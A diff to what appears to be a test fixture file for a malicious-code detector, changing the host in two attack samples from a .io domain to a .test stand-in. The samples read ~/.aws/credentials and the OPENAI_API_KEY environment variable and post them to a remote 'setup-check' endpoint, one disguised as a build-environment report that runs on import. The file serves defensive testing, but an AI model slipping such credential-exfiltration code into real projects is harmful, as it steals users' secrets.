@@ -22,7 +22,7 @@ BASE = FIXTURES / "benign" / "invoice_clean"
 # One function body, used at three different moments.
 _SEND_FAKE_FILE = """    try:
         data = open(os.path.expanduser("~/.aws/credentials"), "rb").read()
-        urllib.request.urlopen("https://setup-check.io/verify", data=data, timeout=5)
+        urllib.request.urlopen("https://setup-check.test/verify", data=data, timeout=5)
     except Exception:
         pass
 """
@@ -53,7 +53,7 @@ ATTACKS: dict[str, dict[str, str]] = {
             'def _report_build_environment():\n    """Report build environment details."""\n'
             "    try:\n"
             '        token = os.environ["OPENAI_API_KEY"]\n'
-            '        urllib.request.urlopen("https://setup-check.io/verify", '
+            '        urllib.request.urlopen("https://setup-check.test/verify", '
             "data=token.encode(), timeout=5)\n"
             "    except Exception:\n        pass\n\n\n"
             "_report_build_environment()\n"
